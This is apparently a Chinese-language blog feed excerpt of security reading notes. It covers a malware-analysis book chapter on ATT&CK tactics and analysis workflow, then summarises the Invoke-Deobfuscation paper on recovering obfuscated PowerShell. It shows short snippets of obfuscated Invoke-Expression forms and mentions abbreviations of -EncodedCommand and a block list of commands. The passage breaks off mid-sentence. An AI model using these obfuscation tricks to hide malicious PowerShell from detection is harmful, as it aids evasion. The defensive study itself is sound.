为了规避和预防攻击的技术和概念</p><p><strong>Software</strong>:用来执行敌手行动的代码，有公开的获得工具和恶意软件结合</p><p><strong>Matrix</strong>: 与特定行业相关的TTP的组合</p><p>‍</p><p>这个框架下有很多Matrix,企业的，ICSs(Industrial Control Systems), 和移动端，最常使用的是企业Matrix</p><h2 id="企业Matrix"><a href="#企业Matrix" class="headerlink" title="企业Matrix"></a>企业Matrix</h2><p>目前，企业框架定义了下面的tactics</p><ol><li>Reconnaissance: 勘察，这个阶段涉及到收集关于受害者的相关信息，比如一些组织的基础设施和人员</li><li>Resource development: 在这里，攻击者根据收集到的信息建立所有必需的依赖关系。这可以通过各种方式实现:购买/租用、创建或窃取先决条件(例如，主机或软件)</li><li>Initial access: 在这里，攻击者尝试在受害者的环境中建立一个据点，最常见的例子就是钓鱼邮件</li><li>Execution:  这里，攻击者执行任何种类的代码来实现目标</li><li>Persistence: 比如SSH</li><li>Privilege escalation:  高权限可以更多控制</li><li>Defence evasion: 主要目标是隐藏不被发现</li><li>Credential access: 这个策略包括窃取凭据以便以后的使用，比如最常见的一些技术涉及dump保存的凭据并拦截，例如通过记录按下的键</li><li>Discovcery: 攻击者收集通过网络和当地的系统收集受害者环境的内部信息，以便于促进其他的策略，比如横向移动</li><li>Lateral movement: 攻击者开始传播到其他的机器直到遇到感兴趣的。</li><li>Collection: 收集感兴趣的信息</li><li>Command and control: 这种策略涵盖了攻击者可能与受损系统远程通信的各种方式。</li><li>Exfiltration: 将敏感信息移出受威胁的环境</li><li>Impact: 最终，这个策略用来藐视攻击者可能对妥协系统带来消极影响的其他方式，比如操作，中断或者破坏关键的系统和数据。</li></ol><img src="/2023/02/20/Mastering_Malware_Analysis_Chapter_1/image-20230217213925-p892n45.png" class="" title="image"><p><strong>STIX</strong>(Structured Threat Information Expression) 用来交换IoCs, 版本1是XML格式，版本2是JSON格式，</p><h1 id="APT-and-zero-day-attacks-and-fileless-malware"><a href="#APT-and-zero-day-attacks-and-fileless-malware" class="headerlink" title="APT and zero-day attacks and fileless malware"></a>APT and zero-day attacks and fileless malware</h1><p>APT: 高级可持续性威胁</p><p>Zero-day: 之前不知道的漏洞</p><p>Fileless malware: 无文件攻击，利用脚本命令</p><p>‍</p><h1 id="选择分析策略"><a href="#选择分析策略" class="headerlink" title="选择分析策略"></a>选择分析策略</h1><h2 id="理解受众"><a href="#理解受众" class="headerlink" title="理解受众"></a>理解受众</h2><p>获取结果的用户不同，行动的成果可能是非常不同的</p><ul><li>Threat intelligence: 获取IoCs，如哈希值、文件名和网络构件，因此，提取嵌入式有效载荷和下载远程样本，以及寻找其他相关模块，并从所有这些模块中提取C&amp;C信息，可能将成为首要任务。</li><li>AV detection: 创建一个不会产生误报的检测，比如于恶意功能相关的字符串或代码片段以及使用的自定义的加密算法。理解主要逻辑将有助于选择正确的类别，代码和数据相似性将有助于分配恶意软件家族。</li><li>Technical article or conference presentation: 在这里，最重要的部分将是与功能、与其他恶意软件家族的相似性以及参与者属性相关的有趣的新技术细节。</li><li>Article for the general public: 对于非技术人员，通常只提供功能的高级描述，而不提供许多技术细节，主要关注影响。</li></ul><h2 id="回答受众的问题"><a href="#回答受众的问题" class="headerlink" title="回答受众的问题"></a>回答受众的问题</h2><img src="/2023/02/20/Mastering_Malware_Analysis_Chapter_1/image-20230220085122-01o4366.png" class="" title="image"><h2 id="定义目标"><a href="#定义目标" class="headerlink" title="定义目标"></a>定义目标</h2><h2 id="避免不必要的技术细节"><a href="#避免不必要的技术细节" class="headerlink" title="避免不必要的技术细节"></a>避免不必要的技术细节</h2><ol><li>根据目标受众选择所需的细节级别</li><li>如果某些事实对读者没有帮助，避免详细阐述</li><li>不要只提到技术细节——解释它们的高级目的以及为什么攻击者必须明确地使用它们</li></ol><h2 id="典型的工作流"><a href="#典型的工作流" class="headerlink" title="典型的工作流"></a>典型的工作流</h2><p>我们怎样组织我们的工作以及时地产生尽可能好的结果？</p><ol><li><p>Triage: 收集样本中容易获得的大量的信息：</p><ul><li>分析PE头</li><li>检查这个样本是否可能被加壳</li><li>检查公共资源中已知的IoCs（哈希值，网络组建,AV检测名字等）</li></ul></li><li><p>行为分析：大部分信息将从文件、注册表和网络操作中获得。这样，我们就会对潜在样本的能力有一个概念。</p></li><li><p>脱壳：如果不脱壳没法进行静态分析，当然有的样本可能没有加壳</p></li><li><p>静态分析：在反汇编器和反编译器打的帮助下进行，从可用的字符串和常被误用的winapi开始。</p></li><li><p>动态分析：在调试器的帮助下进行，设置和执行可能很expensicve，所以只在需要的时候使用它。</p><ul><li>确认某些功能</li><li>处理字符串/API/嵌入的payload/通信加密</li></ul></li></ol><p>‍</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Invoke-Deobfuscation:AST-Based and Semantics-PreservingDeobfuscation for PowerShell Scripts》论文阅读</title>
      <link href="/2022/11/15/paper2_Invoke-Deobfuscation/"/>
      <url>/2022/11/15/paper2_Invoke-Deobfuscation/</url>
      
        <content type="html"><![CDATA[<h1 id="2-Invoke-Deobfuscation-AST-Based-and-Semantics-PreservingDeobfuscation-for-PowerShell-Scripts"><a href="#2-Invoke-Deobfuscation-AST-Based-and-Semantics-PreservingDeobfuscation-for-PowerShell-Scripts" class="headerlink" title="2. Invoke-Deobfuscation:AST-Based and Semantics-PreservingDeobfuscation for PowerShell Scripts"></a>2. Invoke-Deobfuscation:AST-Based and Semantics-PreservingDeobfuscation for PowerShell Scripts</h1><p>这篇文章讲了基于AST的，变量追踪的，保留语义的一个去混淆工具，是开源的</p><p><a href="https://gitee.com/snowroll/invoke-deobfuscation?_from=gitee_search">https://gitee.com/snowroll/invoke-deobfuscation?_from=gitee_search</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h2><p>利用AST的可恢复节点来精确的识别模糊片段，通过Invoke函数和变量跟踪来模拟恢复过程</p><p>‍</p><h2 id="现存方法"><a href="#现存方法" class="headerlink" title="现存方法"></a>现存方法</h2><p><strong>去混淆主要分为3步</strong></p><ol><li>识别混淆片段</li><li>去掉混淆</li><li>重建脚本</li></ol><h3 id="识别混淆"><a href="#识别混淆" class="headerlink" title="识别混淆"></a>识别混淆</h3><p>PSEDM, PSDecode, PowerDrive, and PowerDecode 设计了一系列正则表达式去匹配混淆的片段，这些基于正则表达式的方法忽略了脚本的语法信息</p><p>Li et al.(也就是轻量级的那个论文作者) 设计了一个基于机器学习的分类器去识别模糊的脚本片段，这非常依赖训练的数据</p><p>‍</p><p>‍</p><h3 id="去掉混淆"><a href="#去掉混淆" class="headerlink" title="去掉混淆"></a><strong>去掉混淆</strong></h3><ol><li><p>预定义的恢复规则</p><p> [PSDecode, PowerDrive, Powerdecode] 这种方法仅仅对一部分特别混淆技术有用，但是忽略了语法，所以经常出错</p></li><li><p>覆盖函数</p><p> [PSDecode, PowerDrive, Powerdecode] 这种方法用来处理特定函数的混淆的参数，比如Invoke-Expression，</p></li><li><p>直接执行</p><p> [Powerdecode, Li et al轻量级去混淆工具] 由于大多数混淆后的脚本片段中保存着恢复代码 + 混淆数据，所以直接执行也可以，但是这部分有个缺点，就是容易忽略掉上下文，有时候这些片段中含有变量，忽略了上下文就无法识别这个变量，即无法去混淆。</p></li></ol><h3 id="重建脚本"><a href="#重建脚本" class="headerlink" title="重建脚本"></a>重建脚本</h3><p>先有的所有的脚本重构都是上下文无关的，因此他们恢复后在语法或语义上可能存在错误</p><h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><ol><li>精确识别混淆的片段</li><li>正确恢复混淆的片段</li><li>有效重建脚本，使其在语法和语义上与原始脚本保持一致</li></ol><p>‍</p><h2 id="我们的方法Invoke-Deobfuscation"><a href="#我们的方法Invoke-Deobfuscation" class="headerlink" title="我们的方法Invoke-Deobfuscation"></a>我们的方法Invoke-Deobfuscation</h2><p>‍</p><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><ol><li>基于token和recoverable nodes of AST 识别混淆片段</li><li>利用跟踪变量算法 来获取混淆片段的上下文，并且利用Invoke函数来恢复他们</li><li>基于后续遍历AST的方法重构脚本，而且在合适的位置严格的替换混淆的片段，来尽可能的保持原来的语义</li></ol><h3 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h3><p>样本 2,025,175 wild malicious samples  –预处理-&gt; 39,713 PowerShell scripts</p><p>‍</p><h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>从4个方面来评估 Invoke-Deobfuscation</p><ol><li>处理不同混淆技术的能力</li><li>去混淆的效力和效率</li><li>语义一致性</li><li>obfuscation mitigation(混淆减轻的能力？？)</li></ol><p>‍</p><p>和  PSDecode， PowerDriver, PowerDecode, 和Li et al 这 4中对比</p><p>经过评估，Invoke-Deobfuscation 是表现最好的工具</p><ol><li>足够强壮，可以处理几乎所有已知的混淆</li><li>有效且稳定</li><li>对于恢复关键信息，IP, URL等，Invoke-Deobfuscation  恢复的数量是其他工具的两倍多<strong>（Datacon 2022比赛，，，）</strong>​</li><li>恢复的结果能够与原始脚本在语义上保持一致</li><li>可以显著的减轻脚本混淆</li></ol><p>‍</p><p>‍</p><p>‍</p><h1 id="背景和动力"><a href="#背景和动力" class="headerlink" title="背景和动力"></a>背景和动力</h1><h2 id="PowerShell-和-PowerShell-攻击"><a href="#PowerShell-和-PowerShell-攻击" class="headerlink" title="PowerShell 和 PowerShell 攻击"></a>PowerShell 和 PowerShell 攻击</h2><p>PowerShell 是命令行shell，也是一门脚本语言，他提供了对于一个计算机内核史无前例的权限，包括对Win32API不限制的使用。它还是跨平台的，并且预装在Windows系统上，所以PowerShell已经变为了大量攻击者的喜欢的工具。</p><p>#PowerShell 非常广泛的使用在网络攻击中，比如勒索软件，钓鱼邮件，持续性威胁等等，攻击者能够利用恶意的PowerShell脚本在受害者电脑上安装木马，偷取机密信息或者获得管理员权限。PowerShell攻击不仅能从远程网址下载可执行的文件，并且可以做到不落地执行，这样就绕过了传统的基于文件的防御方法。#​</p><p>‍</p><h2 id="针对POWERSHELL的混淆技术"><a href="#针对POWERSHELL的混淆技术" class="headerlink" title="针对POWERSHELL的混淆技术"></a>针对POWERSHELL的混淆技术</h2><p>Powershell有一堆混淆技术，针对其复杂性，把它分为三个等级</p><p>原始样本：</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120194231-azixits.png" class="" title="image"><p>L1:</p><p>这种混淆技术只具有视觉上的混淆性</p><p>比如，加入空白空格，随机大小写，反引号，别名</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120194249-ic9pirq.png" class="" title="image"><p>L2:</p><p>这种级别的混淆技术可以修改原始脚本的词法特性 和AST的层次结构，但是仍然保留着原始脚本的字符级别的信息</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120194255-069acxm.png" class="" title="image"><p>L3:</p><p>相比L2，去除掉字符级别的信息</p><p>比如：Base64， ASCII等编码都属于这种混淆技术</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120194302-3vnbar9.png" class="" title="image"><p>‍</p><h2 id="混淆对恶意检测的有效性"><a href="#混淆对恶意检测的有效性" class="headerlink" title="混淆对恶意检测的有效性"></a>混淆对恶意检测的有效性</h2><p>混淆后的PowerShell脚本能够隐藏掉原始脚本的意图，并且很容易的避开反病毒软件的检测。</p><p>当前的恶意检测模型主要取决于字符集的特点或者AST特征，然而这些都能很容易的被混淆完全的改变（这里的模型我感觉说的应该是人工智能方面的模型）</p><p>‍</p><h1 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h1><p>Invoke-Deobfuscation 框架</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120205240-al2lum6.png" class="" title="image"><p>‍</p><p>主要分为3个阶段</p><ol><li>令牌解析</li><li>基于AST的变量跟踪和恢复</li><li>重命名+格式化代码</li></ol><h2 id="令牌解析"><a href="#令牌解析" class="headerlink" title="令牌解析"></a>令牌解析</h2><p>令牌解析使用脚本的词汇信息来恢复混淆，大多数的在L1级别的混淆技术都与令牌相关。</p><p>用微软的官方库<code>System.Management.Automation.PSParser</code>​去tokenize， 每个令牌都有许多属性，比如内容，开始位置，长度等，我们利用这些属性去恢复原始的token，并将他们组合来形成去混淆的脚本。</p><p>‍</p><p>图3表示一个简易的令牌解析的过程</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120210100-d9k13qg.png" class="" title="image"><p>逆序的处理顺序允许我们在不解析新脚本的情况下识别未处理的令牌。最终能够得到一个在令牌级别没有混淆的脚本。</p><p>‍</p><h2 id="基于AST的恢复"><a href="#基于AST的恢复" class="headerlink" title="基于AST的恢复"></a>基于AST的恢复</h2><p>不管这个混淆后的脚本多么复杂，他都是原始脚本在经过一系列变化后得到的。混淆后的脚本片段通常包括 混淆的数据以及它的恢复算法，我们称之为可恢复的脚本片段（Recoverable Pieces）</p><p>去混淆的关键就是在混淆后的脚本中识别这些Recoerable Pieces​</p><p>‍</p><h3 id="识别可恢复的片段"><a href="#识别可恢复的片段" class="headerlink" title="识别可恢复的片段"></a>识别可恢复的片段</h3><p>我们使用Powershell AST上特定类型的节点 的内容来识别可恢复的脚本片段。</p><ol><li>PowerShell AST上的每一个节点都是语法上有效的，其中包括Recoverable pieces。</li><li>我们能够获得原始的片段通过执行这个Recoverable pieces. 例如，’he’ + ‘llo’ –&gt; ‘hello’</li></ol><p>因此，我们分析了所有的PowerShell的AST节点的类型，发现这些类型的节点的内容通过执行后可以获得字符串。^(怎么发现的？？？这个地方感觉可以优化一下。)^</p><p>我们叫这些类型的节点为Recoverable nodes</p><ol><li>PipelineAst</li><li>UnaryExpressionAst</li><li>BinaryExpressionAst</li><li>ConvertExpressionAst</li><li>InvokeMemberExpressionAst</li><li>SubExpressionAst</li></ol><p>我们提取了这个可恢复节点的内容作为Recoverable Pieces. 基于可恢复的节点，我们不仅能识别已知的混淆技术，还可以识别未知的混淆技术。</p><p>‍</p><h3 id="基于Invoke的恢复"><a href="#基于Invoke的恢复" class="headerlink" title="基于Invoke的恢复"></a>基于Invoke的恢复</h3><p>把Recoverable Pieces转为Script Block，然后利用成员函数Invoke去执行他本身, 比如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = &#123;<span class="string">&#x27;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#x27;</span> <span class="operator">-f</span> <span class="string">&quot;i&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line"><span class="variable">$a</span>.invoke()</span><br><span class="line"></span><br><span class="line"><span class="comment"># iex</span></span><br></pre></td></tr></table></figure><p>对于不同类型的执行结果，我们将它们转换为相应的字符串形式作为恢复结果，以保留它们的语义。比如得到结果是123，如果他的类型是字符串，则结果为’123’，如果是数字，则是123</p><p>如果执行结果不能以字符串的形式表示，比如是Object，那么我们保留可恢复的脚本片段。</p><p>‍</p><p>对于可恢复的脚本片段可能包含很多与恢复过程不相关的命令，比如<code>Restart-Computer</code>​, <code>Start-Sleep</code>​等。因此，我们创建了这些命令的阻止列表，以加快去混淆的速度。如果可恢复的脚本片段中含有这些不相关的命令，我们不去执行他们，为了安全，我们的工具应该运行在独立的沙盒中。</p><p>‍</p><h3 id="变量追踪"><a href="#变量追踪" class="headerlink" title="变量追踪"></a>变量追踪</h3><p>由于上下文的缺乏，我们不能直接执行这些含有变量的Recoverable pieces</p><p>为了克服这个挑战，我们使用符号表来记录脚本中出现的变量的范围和值，伪代码1显示了变量^（这个算法，不能修改循环中的遍历 \）^​追踪^（这个算法，不能修改循环中和条件表达式中的变量）^​的算法。^(这个算法，不能修改循环中的遍历 )^</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221120220008-z1k2562.png" class="" title="image"><p>通过下面这个例子更容易理解上面的算法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerShell代码如下  </span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># 解析为AST并可视化后为</span></span><br><span class="line"></span><br><span class="line">[<span class="type">NamedBlockAst</span>]: <span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="variable">$a</span>  </span><br><span class="line">--[<span class="type">AssignmentStatementAst</span>]: <span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line">----[<span class="type">VariableExpressionAst</span>]: <span class="variable">$a</span>   </span><br><span class="line">----[<span class="type">CommandExpressionAst</span>]: <span class="number">1</span>   </span><br><span class="line">------[<span class="type">ConstantExpressionAst</span>]: <span class="number">1</span></span><br><span class="line">--[<span class="type">PipelineAst</span>]: <span class="built_in">Write-Host</span> <span class="variable">$a</span>  </span><br><span class="line">----[<span class="type">CommandAst</span>]: <span class="built_in">Write-Host</span> <span class="variable">$a</span></span><br><span class="line">------[<span class="built_in">String</span><span class="type">ConstantExpressionAst</span>]: <span class="built_in">Write-Host</span></span><br><span class="line">------[<span class="type">VariableExpressionAst</span>]: <span class="variable">$a</span></span><br></pre></td></tr></table></figure><p>我们通过AST的结构来记录出现在脚本中的每一个变量的范围。我们把变量分为3类，局部变量，全局变量，环境变量，我们仅仅需要记录局部变量的范围。</p><p>‍</p><p>我们后序遍历AST，并记录当前访问节点的范围​。</p><p>仅仅访问6种类型的节点的时候，当前节点的范围深度会增加或降低。变化取决于遍历的方向，从父级到子级或者反过^（这里暂时不明白）^</p><ol><li>NamedBlockAst</li><li>IfStatementAst</li><li>WhileStatementAst</li><li>ForStatementAst</li><li>ForEachStatementAst</li><li>StatementBlockAst</li></ol><p>我们通过执行分配表达式来记录变量在符号表中的值​</p><p>通过<code>AssignmentStatementAst</code>​，我们能够识别变量和他们的分配表达式。当这个分配表达式含有未知的变量，并且这个变量是不在符号表里的时候，我们不执行这个变量表达式，而且放弃记录这个变量。</p><p>对于环境变量，我们能够使用 Get-Variable 来获得他们正确的值</p><p>我们当前的变量跟踪仍然后许多限制^（确实。。）^</p><p>‍</p><h3 id="Invoke-Expression和PowerShell"><a href="#Invoke-Expression和PowerShell" class="headerlink" title="Invoke-Expression和PowerShell"></a>Invoke-Expression和PowerShell</h3><p>复杂的混淆脚经常包含多层混淆​，比如Invoke-Expression 就可以把后面的字符串作为脚本去执行，而字符串中可能还含有Invoke-Expression等。</p><p>‍</p><p>处理多层混淆的关键就是识别<code>Invoke-Expression</code>​和<code>PowerShell</code>​，然而攻击者经常使用不同的方法来混淆这些命令，例如，<code>.($pshome[4] + $pshome[30] + &#39;x&#39;)</code>​就等同于 <code>Invoke-Expression</code>​, 可以通过变量跟踪将其恢复为<code>.(&#39;iex&#39;)</code>​, iex是Invoke-Expression的别名，. 是可以把后面的字符串作为命令，其他的Invoke-Expression的形式为 </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">iex</span></span><br><span class="line"><span class="string">&#x27;xxx&#x27;</span> | <span class="built_in">iex</span></span><br><span class="line">&amp;<span class="string">&#x27;iex&#x27;</span></span><br></pre></td></tr></table></figure><p>我们能够通过基于AST的变量追踪和恢复来识别Invoke-Expression的不同格式。</p><p>‍</p><p>PowerShell能够执行Base64-encoded命令，通过<code>-EncodedCommand</code>​，这个参数也有各种形式，比如<code>-e</code>​, <code>-eNc</code>​等</p><p>我们转变参数为小写，并且使用<code>&#39;-encodedcommand&#39;.StartsWith($param)</code>​去决定是否这个参数是 <code>-EncodedCommand</code>​，比如<code>&#39;-encodedcommand&#39;.StartsWith(&#39;-enc&#39;)</code>​为True</p><p>‍</p><p>为了处理多层混淆，我们转换Invoke-Expression和PowerShell的参数，而且去混淆。</p><p>重复这个过程，，直到脚本的恢复过程不再发生转换，通过这种方式，我们可以从多层混淆的脚本片段中恢复出原始的脚本片段</p><p>‍</p><h3 id="脚本重建"><a href="#脚本重建" class="headerlink" title="脚本重建"></a>脚本重建</h3><p>通过后序遍历的方法去进行脚本重建，当访问一个节点的时候，用它的孩子节点的内容去替换它</p><p>如果内容是混淆的，则用它的恢复结果去替换它</p><p>最终，我们能够得到完整的去混淆的脚本，通过遍历这个AST的根节点。</p><p>我们在合适的位置替换混淆脚本片段，以使去混淆的脚本 与 混淆的脚本 语义保持一致</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121151137-njiaiji.png" class="" title="image"><p>这个图是一个例子</p><p>最终，访问AST的根节点就可以得到最终的去混淆的脚本。</p><p>‍</p><h2 id="重命名和格式化"><a href="#重命名和格式化" class="headerlink" title="重命名和格式化"></a>重命名和格式化</h2><p>重命名那些随机命名的变量和函数以及重新格式化代码可以使分析人员共容易分析脚本。</p><p>我们根据元音和特殊字符的比例来确定字符串是否是随机的。</p><p>Hayden[29]指出，在普通美式英语中，元音的比例约为37.4%，因此我们假设当英语字符中元音的比例不在32%到42%之间时，字符串是随机的。当一个字符串中的英文字母的比例小于10%时，字符串是随机的，然后用<code>var&#123;num&#125;</code>​ 和 <code>func&#123;num&#125;</code>​去重命名随机的变量</p><p>最后，我们通过删除随机空白字符并用标准格式缩进来重新格式化代码。如图7所示，随机变量名被替换，随机空白字符被删除，此外，这个模块是可以扩展的。</p><p>‍</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121153410-i0o9ngy.png" class="" title="image"><p>‍</p><h1 id="实施和评估"><a href="#实施和评估" class="headerlink" title="实施和评估"></a><strong>实施和评估</strong></h1><p>在这一节中，首先介绍Invoke-Deobfuscation的实施，然后再与其他4个工具进行比较，PowerDrive [17], PSDecode [16], PowerDecode [18], Li et al. [19]</p><p>‍</p><blockquote><blockquote><p>[16] “Psdecode - powershell script for deobfuscating encoded powershell scripts,” <a href="https://github.com/R3MRUM/PSDecode">https://github.com/R3MRUM/PSDecode</a>.<br>[17] D. Ugarte, D. Maiorca, F. Cara, and G. Giacinto, “Powerdrive: Accurate de-obfuscation and analysis of powershell malware,” in Springer DIMVA, 2019.<br>[18] G. M. Malandrone, G. Virdis, G. Giacinto, and D. Maiorca, “Powerdecode: a powershell script decoder dedicated to malware analysis,” in ITASEC, 2021.<br>[19] Z. Li, Q. A. Chen, C. Xiong, Y . Chen, T. Zhu, and H. Yang, “Effective and light-weight deobfuscation and semantic-aware attack detection for powershell scripts,” in ACM CCS, 2019.</p></blockquote></blockquote><p>主要从4个方面进行比较</p><ol><li>处理常见混淆方法的能力</li><li>去混淆的效力和效率</li><li>行为一致性</li><li>obfuscation mitigation</li></ol><h2 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h2><p>Invoke-Deobfuscation用PowerShell编写，源码2500行，而且工具跨平台。</p><p>Invoke-Deobfuscation 主要包含3个模块，每个模块独立使用^（在Datacon的比赛中应该只用去混淆的那个就行）^</p><p>为了避免出现语法错误，在去混淆的过程中，每个步骤之后都要检查结果的语法，如果有语法错误，则跳过deobfuscation步骤</p><p>‍</p><h2 id="评估方法"><a href="#评估方法" class="headerlink" title="评估方法"></a>评估方法</h2><h3 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h3><p>在奇安信的帮助下，我们收集了2025175个恶意样本，根据来源，分为2类，第一类是由反病毒软件标记为powershell的样本，第二类是由TrID或文标记为powershell的样本。</p><p>我们利用样本的语法信息和文本特性删除了无效的或重复的PowerShell样本。然后我们得到了1127349个PowerShell脚本。</p><p>我们发现同一家族中许多恶意脚本的结构高度相似，所以有去除了这些结构相似的样本。</p><p>经过预处理，最终得到了39713个样本，以前的数据集只包含少数类型的混淆技术[30]，甚至来自手动生成[19]。与之前的数据集相比，我们数据集中的脚本的混淆技术、恶意功能和内容结构更加多样</p><blockquote><p>[30] J. White, “Pulling back the curtains on encodedcommand powershell attacks,” <a href="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks">https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks</a></p></blockquote><p>这些脚本的文件大小从8字节到26 MB，数据集的总大小为7.75 GB。</p><p>‍</p><h3 id="混淆的量化"><a href="#混淆的量化" class="headerlink" title="混淆的量化"></a>混淆的量化</h3><p>我们通过对已知的混淆进行评分，进而来量化样本的混淆。比如，在前面的时候，将混淆分为3个等级，L1,L2,L3，比如L1就1分，我们为每个脚本中出现的每种类型的混淆只打分1次，以获得脚本的最终混淆分数。</p><p>‍</p><h2 id="评估结果"><a href="#评估结果" class="headerlink" title="评估结果"></a>评估结果</h2><h3 id="混淆能力"><a href="#混淆能力" class="headerlink" title="混淆能力"></a>混淆能力</h3><p>去混淆的能力取决于它的精确的识别混淆 + 准确的去除混淆</p><p>我们利用已知的混淆技术去混淆命令 <code>write-host hello</code>​并把混淆后的片段放在3个不同的位置</p><ol><li>单独一行</li><li>分配表达式</li><li>管道</li></ol><p>比如假如混淆后的片段是<code>&#39;a&#39;+&#39;b&#39;</code>​ 则分为<code>&#39;a&#39;+&#39;b&#39;</code>​, <code>$tmp=&#39;a&#39;+&#39;b&#39;</code>​, <code>&#39;a&#39;+&#39;b&#39; | out-null</code>​</p><p>对于某种特定的混淆技术，如果一个工具能够恢复出这3个位置的混淆片段（当然，这3个位置的混淆片段肯定是由这种特定的混淆技术去混淆的，不能是其他的），则说明这个工具 针对这种混淆技术 有完全的去混淆能力。</p><p>为了比较，对之前的工具做了点稍稍的改动，比如</p><p>PSDecode、PowerDrive和PowerDecode使用不同的层来存储不同阶段的混淆结果，我们仅仅保留最后一层作为最终结果。</p><p>Li 等人使用分类器来识别AST混淆的子树，但是它这个模型未公开，此外，Li 等人只处理源代码中类型为PipelineAst的子树，因此我们删除了分类模块，并使其工具遍历所有根为PipelineAst的子树，这只会影响一点点运行时间。</p><p>‍</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121161412-y1kh6ch.png" class="" title="image"><p>这个图是不同工具的去混淆能力的比较结果</p><p>由于变量追踪的局限性，我们无法处理经常有循环语句的空白编码混淆^（所以这种编码是啥玩意，，，暂时看不懂）^，然而，这种空白编码混淆仅占数据集的0.1%</p><p>‍</p><p>作为比较</p><p>PSDecode, PowerDrive和PowerDecode仅仅能处理一些混淆技术，因为它们使用正则表达式​来匹配特定的混淆技术，而忽略了脚本的语法。此外，正则表达式需要设计不同的模式来匹配不同的混淆技术，这是不健壮的，无法识别复杂的混淆脚本片段</p><p>‍</p><p>Li 等人只处理PipelineAst节点上的混淆，该节点是粗粒度​的，将会错过许多混淆处理的脚本片段。</p><p>它们无法处理识别和处理最后2个位置的混淆，即上面的 分配表达式 和 管道</p><p>此外，由于缺乏上下文，它们无法处理带有变量的混淆技术。</p><p>‍</p><p>由于这四种工具都没有分析脚本的token，所以它们无法处理在token级别的混淆。</p><p>‍</p><h3 id="去混淆的效果和效率"><a href="#去混淆的效果和效率" class="headerlink" title="去混淆的效果和效率"></a>去混淆的效果和效率</h3><p>我们比较不同工具去混淆的效果​，通过不同工具去混淆后的脚本中保留的关键信息的数目</p><p>同时，我们记录这些工具的去混淆时间来作为效率​的评估</p><p>‍</p><p>我们抽样了100个大小介于97byte - 2KB之间的混淆后的PowerShell代码，挑选了4中关键信息</p><ol><li>.ps1 文件（通常表示恶意脚本路径）</li><li>PowerShell命令</li><li>URL</li><li>IP</li></ol><p>这4种类型的信息对于恶意样本分析来说都是有意义的</p><p>‍</p><p>为了更好的比较，我们采用手动的去混淆的结果作为基准，然后我们分别提取了这4种类型的关键信息。除此之外，还有12个多层混淆的样本，因此我们比较不同的工具处理多层混淆的能力。</p><p>‍</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121174033-ild14hl.png" class="" title="image"><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121174047-atp7qd1.png" class="" title="image">​<p>‍</p><p><strong>先看图5（Effectiveness）</strong></p><p>Invoke-Deobfuscation相比其他工具恢复了更多的关键信息，并且平均96.8%的结果是跟手动处理相同的。这是因为 Invoke-Deobfuscation可以基于AST可恢复节点能够识别和恢复更多的混淆片段。</p><p><strong>再看图6 （Efficiency）</strong></p><p>Invoke-Deobfuscation表现的最有效率和稳定。他的平均处理时间是1.04秒，是所有工具平均时间最少的一个，而且其他的工具处理时间波动比较大，甚至超过了10秒，由于其他工具可能执行了与恢复不想关的命令，比如network connect等， 由于Invoke-Deobfuscation能够通过他的内置的阻止列表，来阻止这些不相关的命令的执行，所以它处理混淆的速度很快。</p><p>‍</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121180433-adyy22n.png" class="" title="image">​<p>‍</p><p><strong>再看表三（处理多层混淆的能力）</strong></p><p>因为多层混淆脚本经常需要调用invoke-Expression 和 PowerShell， 所以Invoke-Obfuscation能够处理。</p><p>PSDecode、PowerDrive和PowerDecode利用overriding function^(这里overriding 